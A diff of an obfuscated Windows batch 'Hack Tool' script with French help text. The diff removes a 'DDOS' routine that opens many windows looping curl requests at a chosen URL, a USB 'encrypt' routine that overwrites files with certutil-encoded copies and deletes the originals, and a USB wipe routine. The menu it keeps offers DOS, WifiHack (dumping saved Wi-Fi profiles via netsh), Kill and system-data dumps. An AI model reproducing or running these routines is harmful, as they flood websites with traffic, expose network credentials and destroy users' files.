@@ -36,7 +36,7 @@ color b
 cls
 
 set "EDITION=Public Edition"
-set "TOOL_VERSION=4.5"
+set "TOOL_VERSION=5.3"
 set "segaduoizdfsdfdflmdfopfksdi=USB_CLONE_FILE"
 set "usbdksskqhdzzfgojdazds=E"
 set "dskpyudhsdujkzhjukaqdhsdq=%USERPROFILE%\Desktop"
@@ -51,6 +51,7 @@ cls
 color a
 
 call :mmdiksokdjnuzehsdzyiudhgzdqwgusduw
+exit
 
 :mmdiksokdjnuzehsdzyiudhgzdqwgusduw
 call :tltlkdlsqjskqdjzijdedjcwdcwldskskjidsqkdzjd
@@ -63,82 +64,40 @@ color a
 set /p cmmdiopqscer="Enter the Commands : "
 call :lfkiopsxcfopieza
 if "%cmmdiopqscer%"=="1" (
-    call :hlpsdfgxcwxcbrtyui
+    call :cmdqsdkqzloidsdkfcldhzujdhn
 ) else if "%cmmdiopqscer%"=="2" (
     call :doklijnbonbyvbgsahzbe
 ) else if "%cmmdiopqscer%"=="3" (
-    call :dtdoklijnbonbyvbgsahzbe
-) else if "%cmmdiopqscer%"=="4" (
     call :hfexopkolsjhjkazndb
-) else if "%cmmdiopqscer%"=="5" (
-    call :idlfgdjkcvxpxcswnxc
-) else if "%cmmdiopqscer%"=="6" (
-    call :wfhoieyddfclsjvxjchqsd
-) else if "%cmmdiopqscer%"=="7" (
-    call :ntsdfghwxciuyiazenjuejksdqstjkjcxw
-) else if "%cmmdiopqscer%"=="8" (
+) else if "%cmmdiopqscer%"=="4" (
     call :kllltyxhwcugbsydgbzuaedfdgs
-) else if "%cmmdiopqscer%"=="9" (
+) else if "%cmmdiopqscer%"=="5" (
+    call :wfhoieyddfclsjvxjchqsd
+) else if "%cmmdiopqscer%"=="6" (
     call :sdsyhujhujdaolidjkfcc
-) else if "%cmmdiopqscer%"=="10" (
-    call :dkfjsudfjsuusbijdfusdhfusdcldfondfjdsfdf
-) else if "%cmmdiopqscer%"=="11" (
-    call :sbijdusdjhisersrifjduisfdjhsiudhfsxcfsjfkdf
-) else if "%cmmdiopqscer%"=="12" (
-    call :chfgptdikfjsieosfjedifjfleifjseifhjeuzioerioudsfdf
-) else if "%cmmdiopqscer%"=="13" (
-    call :csgflneiorfujsiohejfuisjehfkuszehjfkzefghdsfdfsfez
-) else if "%cmmdiopqscer%"=="14" (
-    call :lstfgldedsiorjtgouirjdgfgfdg
-) else if "%cmmdiopqscer%"=="15" (
-    call :edsodofsjdkndjfsifjdofciodjfsoijfdor
-) else if "%cmmdiopqscer%"=="16" (
-    call :dcrtpsdoskiqdhjfksdhfdfjdfisdhjfgsdkjfsdfsdfeiruezordsf
-) else if "%cmmdiopqscer%"=="17" (
-    call :chkoujiedjsodjfsiueusbikfjsdkfdinfdldsk
-) else if "%cmmdiopqscer%"=="18" (
-    call :dfoiuytghjklcx
-) else if "%cmmdiopqscer%"=="19" (
+) else if "%cmmdiopqscer%"=="7" (
     call :crdttkdfjslfsiodkjwxcuyzpedjuhpqzdqsd
-) else if "%cmmdiopqscer%"=="20" (
+) else if "%cmmdiopqscer%"=="8" (
     call :vrsspoikdpzeaikdpzaurfdlmsuqldkmswuicxlc
-) else if "%cmmdiopqscer%"=="21" (
+) else if "%cmmdiopqscer%"=="9" (
     call :clrklsdjqskdsnclsoiurziofekdfjoskdjfscd
-) else if "%cmmdiopqscer%"=="22" (
+) else if "%cmmdiopqscer%"=="10" (
     exit
-) else if "%cmmdiopqscer%"=="23" (
+) else if "%cmmdiopqscer%"=="11" (
     call :ddpsslinvflkjazedswfc
-) else if "%cmmdiopqscer%"=="24 5" (
-    call :svppfidofsidkjvjieokazjdszqdsjwkcoixchjye
-) else if "%cmmdiopqscer%"=="24 6" (
-    call :svhcksodsklqmzilkxwfoivprjkozpfedfhkslodfjhd
-) else if "%cmmdiopqscer%"=="24 7" (
-    call :svneteopidksjfpsdfucjeoixeufjaoizerhdskjcuhxv
-) else if "%cmmdiopqscer%"=="24 9" (
-    call :sasydikjnbhnudbsuyqtzgedhstdggsqdazefd
-) else if "%cmmdiopqscer%"=="15" (
-    call :cmdqsdkqzloidsdkfcldhzujdhn
 ) else (
     echo Invalid Commande : ^| %cmmdiopqscer% ^|
 )
 set cmmdiopqscer="None"
 goto cmdllllopdzikdqhjuzdhzqedrgqhuytsegdtvsydqsfdhqsfdqhtydefzyte
 
-:dfoiuytghjklcx
-color c
-tree
-color a
-goto :EOF
+
 :sdsyhujhujdaolidjkfcc
 color c
 systeminfo
 color a
 goto :EOF
-:idlfgdjkcvxpxcswnxc
-color c
-ipconfig /all
-color a
-goto :EOF
+
 :wfhoieyddfclsjvxjchqsd
 color c
 echo.
@@ -161,161 +120,6 @@ for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil 
 echo.
 goto :EOF
 
-:lstfgldedsiorjtgouirjdgfgfdg
-
-set "sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord=%usbdksskqhdzzfgojdazds%:\"
-
-if not exist "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%" (
-    color c
-    echo .
-    echo NO USB DRIVE DETECTED TO %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%.
-    echo .
-    pause
-    goto :EOF
-)
-
-echo LISTING ALL FILES ON USB DRIVE %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord% ...
-if exist "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%\*" (
-    dir "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%" /a
-) else (
-    echo NO FILES FOUND ON USB.
-)
-pause
-
-goto :EOF
-
-:edsodofsjdkndjfsifjdofciodjfsoijfdor
-
-set "sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord=%usbdksskqhdzzfgojdazds%:\"
-
-if not exist "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%" (
-    color c
-    echo .
-    echo NO USB DRIVE DETECTED TO %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%.
-    echo .
-    pause
-    goto :EOF
-)
-color c
-echo .
-echo ENCRYPTING FILES ON USB DRIVE %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord% ...
-
-for %%f in ("%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%\*.*") do (
-    if /I not "%%~xf"==".enc" (
-        set "fllflldfksdlfjseiofjsdiofjsdiojfccikjxvodneords=%%f"
-        certutil -encode "!fllflldfksdlfjseiofjsdiofjsdiojfccikjxvodneords!" "!fllflldfksdlfjseiofjsdiofjsdiojfccikjxvodneords!.enc" >nul
-        if exist "!fllflldfksdlfjseiofjsdiofjsdiojfccikjxvodneords!.enc" (
-            del /f /q "!fllflldfksdlfjseiofjsdiofjsdiojfccikjxvodneords!"
-        )
-    )
-)
-
-color a
-echo .
-echo ALL FILES HAVE BEEN ENCRYPTED.
-
-goto :EOF
-
-:dcrtpsdoskiqdhjfksdhfdfjdfisdhjfgsdkjfsdfsdfeiruezordsf
-
-set "sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord=%usbdksskqhdzzfgojdazds%:\"
-
-if not exist "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%" (
-    color c
-    echo .
-    echo NO USB DRIVE DETECTED TO %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%.
-    echo .
-    pause
-    goto :EOF
-)
-
-color b
-echo .
-echo DECRYPTING FILES ON USB DRIVE %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord% ...
-
-for %%f in ("%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%\*.enc") do (
-    set "fllflldfksdlfjseiofjsdiofjsdiojfccikjxvodneords=%%f"
-    set "segaduoizdfsdfdflmdfopfksdi=!fllflldfksdlfjseiofjsdiofjsdiojfccikjxvodneords:.enc=!"
-    certutil -decode "!fllflldfksdlfjseiofjsdiofjsdiojfccikjxvodneords!" "!segaduoizdfsdfdflmdfopfksdi!" >nul
-    if exist "!fllflldfksdlfjseiofjsdiofjsdiojfccikjxvodneords!" (
-        del /f /q "!fllflldfksdlfjseiofjsdiofjsdiojfccikjxvodneords!"
-    )
-)
-
-echo .
-echo ALL FILES HAVE BEEN DECRYPTED.
-
-goto :EOF
-
-:chkoujiedjsodjfsiueusbikfjsdkfdinfdldsk
-
-set "sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord=%usbdksskqhdzzfgojdazds%:\"
-
-if not exist "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%" (
-    color c
-    echo .
-    echo NO USB DRIVE DETECTED TO %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%.
-    echo .
-    pause
-    goto :EOF
-)
-
-echo .
-echo CHECKING USB INFORMATION FOR DRIVE %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord% ...
-echo .
-call :grgdkfjsdushqjduzoduijhderedsq
-echo .
-wmic logicaldisk where "DeviceID='%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord:~0,2%'" get VolumeName, FileSystem, FreeSpace, Size
-
-goto :EOF
-
-:csgflneiorfujsiohejfuisjehfkuszehjfkzefghdsfdfsfez
-
-color b
-echo .
-echo FILE NAME : %segaduoizdfsdfdflmdfopfksdi%
-echo .
-echo ENTER THE NEW FILE NAME
-set /p NEWsegaduoizdfsdfdflmdfopfksdi=": "
-set segaduoizdfsdfdflmdfopfksdi=%NEWsegaduoizdfsdfdflmdfopfksdi%
-
-echo FILE NAME HAS CHANGED TO : %segaduoizdfsdfdflmdfopfksdi%
-
-goto :EOF
-
-:sbijdusdjhisersrifjduisfdjhsiudhfsxcfsjfkdf
-
-set "sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord=%usbdksskqhdzzfgojdazds%:\"
-
-if not exist "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%" (
-    color c
-    echo .
-    echo NO USB DRIVE DETECTED TO %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%.
-    echo .
-    pause
-    goto :EOF
-)
-
-color c
-echo WARNING : ALL DATA ON %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord% WILL BE DELETED !
-echo ARE YOU SURE ? (Y/N)
-
-set /p rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf=": "
-if /I "%rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf%" == "Y" (
-    echo in progress...
-) else if  /I "%rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf%" == "yes" (
-    echo in progress...
-) else (
-    echo Canceled !
-    goto :EOF
-)
-
-del /F /S /Q "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%\*"
-for /d %%x in ("%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%\*") do rd /s /q "%%x"
-
-echo ALL FILES HAVE BEEN DELETED FROM %sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%.
-
-goto :EOF
 
 :shvrsdofikdosfkjeopfddlkfvxcdfdfzerdgfdhgjsdfcx
 
@@ -324,106 +128,23 @@ echo TOOL VERSION : %TOOL_VERSION%
 
 goto :EOF
 
-:dkfjsudfjsuusbijdfusdhfusdcldfondfjdsfdf
-
-color b
-
-echo WAITING FOR USB DRIVE...
-echo .
-
-:fohjsjkfhsdkjfshkfjlsdhfjksdhfplsdjfghjsdfuzoidfuzefhefchjksdfghsdjc
-set "sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord=%usbdksskqhdzzfgojdazds%:\"
-
-if not exist "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%" (
-    if "%usbdksskqhdzzfgojdazds%"=="D" (set "%usbdksskqhdzzfgojdazds%"="E") else (set "%usbdksskqhdzzfgojdazds%"="D")
-    goto :fohjsjkfhsdkjfshkfjlsdhfjksdhfplsdjfghjsdfuzoidfuzefhefchjksdfghsdjc
-) 
-
-color a
-echo USB DRIVE HAS BEEN VERIFIED !
-echo .
-color b
-echo GENERATING FOLDER NAME...
-
-:generate
-set "rand=%random%"
-set "bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez=%dskpyudhsdujkzhjukaqdhsdq%\%segaduoizdfsdfdflmdfopfksdi%_%rand%"
-
-if exist "%bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez%" (
-    goto :generate
-)
-
-echo .
-color a
-echo FOLDER NAME HAS BEEN GENERATED : %bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez%
-echo .
-color b
-echo GENERATING FOLDER...
-mkdir "%bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez%"
-echo .
-color a
-echo FOLDER HAS BEEN GENERATED !
-color b
-echo .
-echo COPYING FILES...
-echo .
-
-xcopy "%sbdrvdkfjskdflesfidsjkfldsirjeilrdpovcvxlrittgspeord%\*" "%bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez%\" /E /H /C /I /Y
-color a
-echo.
-echo FILES HAVE BEEN COPIED TO : %bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez% !
-echo .
-echo DO YOU WANT TO OPEN THE FOLDER ? (Y/N)
-
-set /p rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf=": "
-
-echo .
-if /I NOT "%rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf%"=="Y" if /I NOT "%rpsdofkksjuiofjernkfjeoiuzhjreirazeorjeioudsfsdf%"=="Yes" (
-    echo FOLDER WAS NOT OPENED.
-    goto :EOF
-)
-
-color b
-echo .
-echo OPENING FILE...
-start "" "%bkpfldrsdijdiousfjdfoisdjofisdjfdskfseliruodiufkxcvcxnvez%"
-color a
-echo .
-echo FOLDER HAS BEEN OPENED.
-
-goto :EOF
-
-:chfgptdikfjsieosfjedifjfleifjseifhjeuzioerioudsfdf
-
-color b
-echo .
-echo CHANGING PORT...
-echo .
-echo PORT : %usbdksskqhdzzfgojdazds%
-echo .
-echo ENTER THE NEW PORT
-set /p nwprtpoerieodusfidofjuncxvkcuyvheuizriodjsfd=": "
-set usbdksskqhdzzfgojdazds=%nwprtpoerieodusfidofjuncxvkcuyvheuizriodjsfd%
-echo .
-echo PORT CHANGED TO %usbdksskqhdzzfgojdazds%
-
-goto :EOF
-
 :clrklsdjqskdsnclsoiurziofekdfjoskdjfscd
+
 cls
 call :tltlkdlsqjskqdjzijdedjcwdcwldskskjidsqkdzjd
 call :lfkiopsxcfopieza
 call :cmdqsdkqzloidsdkfcldhzujdhn
+
 goto :EOF
-:ntsdfghwxciuyiazenjuejksdqstjkjcxw
-color c
-netstat
-goto :EOF
+
 :hfexopkolsjhjkazndb
+
 color c
 dir /s
 color a
+
 goto :EOF
+
 :kllltyxhwcugbsydgbzuaedfdgs
 
 color c
@@ -440,24 +161,15 @@ Start
 Start
 Start
 goto odpfkdsoxcvnksdihjnwbxcyiugwbhsdcwxd
-goto :EOF
-:ddpsslinvflkjazedswfc
-start https://discord.gg/BtkPH5PDdR
-goto :EOF
-:dtdoklijnbonbyvbgsahzbe
-color 01
-set /p "URL=Enter the URL: "
-color 05
-set /p "Request_Number=Enter the number of requests per CMD: "
-color 0e
-set /p "CMD_Number=Enter the number of CMD windows to open: "
-color a
 
-for /l %%j in (1,1,%CMD_Number%) do (
-    start cmd /c "title DDOS & color c & (for /l %%i in (1,1,%Request_Number%) do curl %URL%) & color a & goto :EOF"
-)
-color c
-goto : EOF
+goto :EOF
+
+:ddpsslinvflkjazedswfc
+
+start https://discord.gg/BtkPH5PDdR
+
+goto :EOF
+
 :doklijnbonbyvbgsahzbe
 color 01
 set /p URL="Enter the URL : "
@@ -478,6 +190,7 @@ echo         ##    ## ##       ##        ##   ##   ##  ##     ## ##    ##
 echo          ######  ######## ######## #### ##     ##  #######   ######  
 echo .
 goto :EOF
+
 :crdttkdfjslfsiodkjwxcuyzpedjuhpqzdqsd
 call :tltlkdlsqjskqdjzijdedjcwdcwldskskjidsqkdzjd
 call :lfkiopsxcfopieza
@@ -534,47 +247,23 @@ systeminfo >> %brseaj%\Hack_Tool_SystemData.txt
 color a
 echo Fichier cree dans bureaux
 goto :EOF
-:hlpsdfgxcwxcbrtyui
-call :lfkiopsxcfopieza
-echo .
-call :tltlkdlsqjskqdjzijdedjcwdcwldskskjidsqkdzjd
-echo .
-call :lfkiopsxcfopieza
-call :cmdqsdkqzloidsdkfcldhzujdhn
-call :lfkiopsxcfopieza
-echo Voici le tutoriel pour utiliser les commandes :
-echo Pour executer toutes les commandes il faut utiliser leur numero associer par exemple
-echo ecrire 1 pour utiliser la commande help.
-call :lfkiopsxcfopieza
-echo Voici comment utiliser la commande [24] Save
-echo cette commande fonctionne uniquement avec les commandes IP, WifiHack, Net, SystemData
-echo pour l'utiliser il faut mettre 24 mettre un espace puis mettre le numero de la commande
-echo par exemple si je veux save la commande IP
-echo vous devez faire 24 5
-echo et vous trouverez un fichier texte sur votre bureaux avec le resultat de la commande a l'interieur.
-echo .
-goto :EOF
+
 :cmdqsdkqzloidsdkfcldhzujdhn
 echo .
 echo     []==================================================================================[]
 echo     []                                   Commands                                       []
 echo     []==================================================================================[]
-echo     [] [1] Help                    [] [2] DOS                    [] [3] DDOS            []
-echo     [] [4] HackEffect              [] [5] IP                     [] [6] WifiHack        []
-echo     [] [7] Net                     [] [8] Kill                   [] [9] SystemData      []
-echo     [] [10] USB CLONE              [] [11] USB ERASE             [] [12] CHANGE PORT    []
-echo     [] [13] CHANGE FILE NAME       [] [14] LIST FILES            [] [15] ENCRYPT USB    []
-echo     [] [16] DECRYPT USB            [] [17] CHECK USB INFO        [] [18] DataFiles      []
-echo     [] [19] Credits                [] [20] Version               [] [21] Clear          []
-echo     [] [22] Leave                  [] [23] Discord               [] [24] Save {5;6;7;9} []
-echo     [] [25] Commands               [] [ ]                        [] [ ]                 []
+echo     [] [1] Commands                [] [2] DOS                    [] [3] HackEffect      []
+echo     [] [4] Kill                    [] [5] WifiHack               [] [6] SystemData      []
+echo     [] [7] Credits                 [] [8] Version                [] [9] Clear           []
+echo     [] [10] Leave                  [] [11] Discord               [] [ ]                 []
 echo     []==================================================================================[]
 echo .
 call :lfkiopsxcfopieza
 goto :EOF
 :vrsspoikdpzeaikdpzaurfdlmsuqldkmswuicxlc
+echo Edition : %EDITION%
 echo Version : %TOOL_VERSION%
-echo Last Update : %lstupdskqdzieszheygzsedqzhedtqgsfd%
 goto :EOF
 
 :dtclrlsdjsikjedfgsjdfudfhjeuzfhzeukrfuedfkshdksdf
@@ -731,6 +420,7 @@ goto :EOF
 :lfkiopsxcfopieza
 echo ============================================================================================================
 goto :EOF
+
 :lfkiopsxcf
 echo ======================================================================================== >> %akoppdsqdcrghsdazfv%
 goto :EOF
